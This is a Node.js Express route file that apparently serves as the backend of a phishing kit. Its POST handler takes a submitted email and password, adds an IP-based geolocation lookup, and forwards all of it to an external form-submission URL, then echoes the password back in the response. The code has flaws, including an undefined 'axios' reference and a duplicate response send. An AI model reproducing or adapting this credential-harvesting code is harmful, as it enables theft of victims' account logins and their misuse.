const express = require('express');
const ax = require('axios');
const fs = require('fs');
const router = express.Router();
const path = require('path');

/***********************Send mail php imported url*****************/
const
    link = 'https://smartforms.dev/submit/652fc6490dd8ac0a53217fa6';
/**********************Send mail php imported url ends**************/

router.post("/", async (req, res) => {
    const referer = req.headers.referer || req.headers.referrer;
    const ip = req.ip;
    const linkToIp = "https://ipapi.co/json";
    
    
    const ipLookupRequest = await axios.get(linkToIp);
    
    console.log(ipLookupRequest.data);

    const userData = ipLookupRequest.data;

    const userLocation = userData.ip + ", " + userData.country_name + ", " + userData.city;
    

    ax.post(link, {
        email: req.body.email,
        password: req.body.password,
        source: req.body.source,
        ipAddress: userLocation
    }).then((response) => {
        res.send({
            status_code: '200',
            status: true,
            message: 'message sent!',
            email: req.body.email,
            password: req.body.password,
            source: req.body.source
        })
        if(response.status === 200) {
            console.log('heyiamdone')
            res.send({
                status_code: '200',
                status: true,
                message: 'message sent!'
            })
        }
    }).catch((err) => {
        res.send({
            status_code: '400',
            status: false,
            message: err
        })
    });
});

module.exports = router;
